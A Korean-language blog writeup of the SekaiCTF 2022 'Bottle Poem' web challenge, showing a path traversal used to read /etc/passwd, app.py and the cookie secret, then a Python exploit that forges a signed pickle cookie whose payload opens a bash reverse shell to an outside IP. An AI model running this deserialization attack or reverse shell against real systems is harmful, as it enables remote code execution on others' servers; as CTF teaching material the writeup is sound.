---
title: "[SekaiCTF 2022] Bottle Poem"
date: 2022-10-03 18:28:00 +09:00
author: aestera
categories: [CTF, Writeup]
tags: [Writeup]
---

# Bottle Poem


![Untitled](/assets/img/post_images/Bottle_Poem/main.png)
SekaiCTF의 첫번째 Web문제이자 1단계 문제였지만.. 엄청나게 삽질했다
<br><br>

![Untitled](/assets/img/post_images/Bottle_Poem/read.png)

문제의 메인 페이지이다. 하이퍼링크를 클릭해보면
<br><br>

![Untitled](/assets/img/post_images/Bottle_Poem/poem.png)

이렇게 시가 보인다. URL의 id라는 인자로 ```/etc/passwd```를 얻는데 성공했지만 FLAG는 없었다. 문제 설명을 다시 보면 FLAG는 서버에 실행 파일로 존재한다고 적혀있다. 즉 이런 방식으로는 플래그를 획득할 수 없다. RCE를 해야 할 것 같다.
<br>

```/proc/self/cmdline``` 경로에 들어가서 프로세스가 실행된 방식을 파악해 app.py의 경로를 찾았다.

***python3 -u /app/app.py***
```python
#app.py
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```
app.py의 코드이다. 몰랐던 경로인 /sign이 있다.
<br>

![Untitled](/assets/img/post_images/Bottle_Poem/sign.png)

접속해보면 이러한 문구가 뜨고 아무 일도 일어나지 않는다. 현재 조작할 수 있는 유일한 값인 Cookie를 이용해야 할 것 같다.
<br><br>


![Untitled](/assets/img/post_images/Bottle_Poem/bottle.png)

[Bottle Documentation](https://bottlepy.org/docs/dev/bottle-docs.pdf)<br>
Bottle framework Docmentation 16페이지를 보면 Bottle의 쿠키들은 자동적으로 pickle로 직렬화되고 역직렬화된다는 것을 알 수 있다. ***pickle 역직렬화 취약점***을 이용하여 Cookie값을 잘 조작해 리버스 쉘을 딸 수 있을 것 같다.
<br><br>

***/app/config/secret.py***
![Untitled](/assets/img/post_images/Bottle_Poem/secret.png)

먼저 쿠키를 내맘대로 만들기 위해 경로를 확인해 sekai값을 알아냈다.
<br><br>

****

# Exploit

```python
import  os
from  bottle  import *
import  requests
sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
url = "http://bottle-poem.ctf.sekai.team/sign"

class RCE:
  def  __reduce__(self):
    cmd = ("bash -c 'exec bash -i &>/dev/tcp/43.200.117.188/56501 <&1'")
    return  os.system, (cmd,)

response.set_cookie("name", RCE(), secret=sekai)
payload = str(response)
payload = payload.replace("Content-Type: text/html; charset=UTF-8\nSet-Cookie: name=", '')
payload = payload.strip()
payload_send = {"name":f'{payload}'}
print("[+] Sending %s" % payload_send)
send_exploit = requests.get(url, cookies=payload_send)
```
위 스크립트를 실행시켜 revers shell을 획득해 flag를 실행시켰다.
<br><br>
![Untitled](/assets/img/post_images/Bottle_Poem/flag.png)
<br><br>

***SEKAI{W3lcome_To_Our_Bottle}***